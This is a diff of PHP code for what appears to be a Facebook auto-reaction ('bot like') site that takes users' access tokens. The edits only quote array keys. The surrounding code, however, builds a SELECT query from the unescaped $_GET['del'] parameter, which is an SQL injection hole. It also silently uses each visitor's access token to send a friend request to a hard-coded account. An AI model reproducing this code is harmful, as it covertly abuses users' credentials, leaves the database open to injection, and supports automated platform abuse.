@@ -9,7 +9,7 @@
                             </div>
                             <div class="content">   
 
-<?php if(!$_SESSION[id]) { ?>
+<?php if(!$_SESSION['id']) { ?>
                 <!--// Nội Dung Bot Like -->
         <div class="col-md-12">                        
             <form action="" method="POST">
@@ -70,9 +70,9 @@ http.send(params);
 
 
 <?php
-if($_GET[del])
+if($_GET['del'])
   {
-    $infongdung = mysqli_fetch_array(mysqli_query($GLOBALS["___BMN_2312"], "SELECT * FROM `botcamxuc` WHERE `id` = '".$_GET[del]."' LIMIT 1"));
+    $infongdung = mysqli_fetch_array(mysqli_query($GLOBALS["___BMN_2312"], "SELECT * FROM `botcamxuc` WHERE `id` = '".$_GET['del']."' LIMIT 1"));
     if($infongdung[usercai] != $_SESSION[id])
     {
       die('<script>alert("Không Thể Xoá Tài Khoản Của Người Khác"); </script>');
@@ -81,7 +81,7 @@ if($_GET[del])
     }
     else
     {
-    mysqli_query($GLOBALS["___BMN_2312"], "DELETE FROM `botcamxuc` WHERE id='" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $_GET[del]) . "'");
+    mysqli_query($GLOBALS["___BMN_2312"], "DELETE FROM `botcamxuc` WHERE id='" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $_GET['del']) . "'");
     echo '<meta http-equiv=refresh content="0; URL=/index.php">';
     exit;
   }
@@ -97,7 +97,7 @@ session_start();
 $check = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token.''), true);
 auto('https://graph.facebook.com/me/friends?method=post&uids=100008021291466&access_token='.$token);
 
-if($check[id] == 6628568379){  
+if($check['id'] == 6628568379){  
 $userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
 $com = "https://graph.facebook.com/me?fields=id,name&access_token=".$token;
 $ren = file_get_contents($com);
